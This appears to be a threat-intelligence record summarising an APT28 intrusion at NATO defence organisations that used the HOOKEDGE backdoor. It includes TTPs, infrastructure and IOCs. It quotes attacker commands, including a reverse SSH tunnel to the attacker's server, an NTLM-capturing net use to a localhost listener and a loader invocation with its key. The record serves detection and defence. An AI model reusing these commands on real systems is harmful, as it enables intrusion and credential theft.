description: >
  Attribution: Symantec Threat Hunter Team (Broadcom) attributes this activity to Swallowtail,
  its name for APT28 / Fancy Bear / Forest Blizzard (GRU Unit 26165), via use of the HOOKEDGE
  backdoor. HOOKEDGE was first documented by Recorded Future Insikt Group on 2026-08-27 under the
  BlueDelta name (moderate-confidence attribution based on code and tradecraft overlap with
  HEADLACE) and by Lab52/S2 Grupo on 2026-02-13 as Operation MacroMaze. Symantec's report extends
  the public record with post-compromise tradecraft: two credential-theft techniques, a persistent
  reverse SSH tunnel and a previously undocumented reflective loader (ld.exe). Confidence: high
  (three independent vendors converge on APT28; US government attribution of APT28 to GRU per
  CISA AA25-141A).

  Victimology: organizations in two unnamed NATO member states — a law enforcement agency, a naval
  shipbuilder and a manufacturer of military aircraft engines. The detailed intrusion is the naval
  shipbuilder: initial access on 2026-07-24 via a macro-enabled Word document opened from the
  Outlook attachment cache (T1566.001, T1204.002, T1059.005); hands-on-keyboard activity
  2026-07-27 to 2026-07-31; HOOKEDGE artefacts still present late August; last VBS launcher
  sighting 2026-09-24. Earlier HOOKEDGE waves (Recorded Future) hit government/diplomatic targets
  in Romania, Spain and Turkiye between 2025-09-26 and 2026-04.

  TTPs: obfuscated VBA AutoOpen drops a VBS launcher, HTM/XHTML exfiltration wrappers and a batch
  script (T1027.013, T1140); batch kills msedge.exe and relaunches a 1x1 pixel off-screen Edge
  window with a base64 data: URL (T1564.003, T1218) that fetches tasking from webhook.site and
  saves the response as a .cmd (T1583.006, T1102.002, T1071.001, T1105); persistence via
  scheduled task (T1053.005); recon batch probing dl.dropboxusercontent.com, accounts.google.com,
  login.microsoftonline.com, mega.nz, example.com and a bare IP 23.220.75.245 to test outbound
  channels (T1016, T1082, T1057, T1083, T1033) — 23.220.75.245 is deliberately omitted from the
  IOC lists as it is an egress-connectivity probe target, not attacker infrastructure. Second
  stage (2026-07-27) abandons webhook.site for dedicated infrastructure 185.82.218.119:443 with
  per-session UUID paths (53379b62-... installer/scheduled-task id, 5b73dc69-... C2 session id);
  tasks POST an ack, run the operator command, upload output with curl --data-binary and delete
  temp files (T1041, T1070.004). Credential theft #1: an SSH private key is pushed to
  C:\ProgramData\Adobe\id_rsa, ACLs adjusted with icacls/cacls, then the built-in Windows OpenSSH
  client opens a backgrounded reverse tunnel ssh -i id_rsa -p 80 root@185.82.218.119 -R
  185.82.218.119:48097 -Nf with StrictHostKeyChecking=no and legacy ssh-rsa forced (T1572,
  T1021.004, T1090). Credential theft #2: a self-contained PowerShell HttpListener on
  http://localhost:8080/ plus net use f: \\localhost@8080\c$ forces the host to authenticate to
  itself and captures NTLMv2 challenge/response pairs (up to four) for offline cracking or relay
  (T1557.001 / T1187, T1059.001). Discovery: whoami /all, net groups, net group Administrators,
  systeminfo, tasklist, wmic qfe, internal DNS lookups and pings including a probable mail server
  (T1069.002, T1018, T1087). Reflective loader ld.exe (SHA-256
  f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) takes a 32-hex key and an
  encrypted file as arguments, decrypts in memory (plaintext starts with marker ADSA 0x41534441)
  and calls exported function ExecuteLoader; observed command line C:\ProgramData\ld.exe
  DE063CF3F2E2A83E7B1A277C052A340E C:\ProgramData\Events.dat; Events.dat was not recovered
  (T1620, T1027). Tunnel torn down 2026-07-28 with taskkill /f /t /im ssh.exe.

  Infrastructure roles (first seen per Symantec timeline): 185.82.218.119 — second-stage
  tasking/exfiltration server (HTTPS on 443, per-UUID paths) and SSH tunnel endpoint (SSH on port
  80), active from 2026-07-27, last operator tasking 2026-07-31. Enrichment 2026-10-23: AS59729
  (ITLDC / ITL-BG, Route 95 LLC), network 185.82.216.0/22, geo Bulgaria, hosting/data-center;
  Shodan shows only port 22 OpenSSH 7.4, hostname linux.server; VirusTotal 6 malicious verdicts;
  AbuseIPDB 0 reports; DShield historic blocklist.de entries 2021-10 (unrelated prior abuse of the
  same address). webhook.site endpoints: 890efd8d-6e9e-428a-bcf9-987745d71000 — first-stage
  staging/tasking and canary (2026-07-24); 53379b62-8020-41cf-af57-effa6e1e8506 and
  5b73dc69-d765-4440-a4d2-e9eb33283eb9 — second-stage identifiers reused as paths on the
  dedicated server; d828b9fc-5435-4b1c-881f-d6350c11d0b6 and ca3c058e-3c88-449b-8299-822cd5d5e17c
  — additional endpoints listed by Symantec without a stated role. webhook.site is a legitimate
  service; only the listed UUID paths are malicious.

